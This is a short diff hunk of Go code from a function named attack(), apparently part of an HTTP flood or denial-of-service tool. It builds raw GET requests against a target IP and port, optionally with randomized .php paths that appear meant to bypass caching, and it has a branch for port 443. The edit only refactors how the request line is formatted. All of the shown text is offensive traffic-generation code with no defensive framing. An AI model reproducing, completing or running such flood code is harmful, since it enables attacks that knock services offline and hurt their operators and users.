@@ -103,7 +103,7 @@ func attack() {
 		if rpath == true {
 			path = "/" + a_z[rand.Intn(len(a_z))] + a_z[rand.Intn(len(a_z))] + a_z[rand.Intn(len(a_z))] + a_z[rand.Intn(len(a_z))] + a_z[rand.Intn(len(a_z))] + a_z[rand.Intn(len(a_z))] + a_z[rand.Intn(len(a_z))] + a_z[rand.Intn(len(a_z))] + ".php"
 		}
-		get_host := "GET " + path + " HTTP/1.1\r\nHost: " + ip + ":" + strconv.Itoa(port) + "\r\n"
+		get_host := fmt.Sprintf("GET %s HTTP/1.1\r\nHost:%s:%d\r\n", path, ip, port)
 		request := get_host + header
 		addr := ip + ":" + strconv.Itoa(port)
 		if port == 443 {
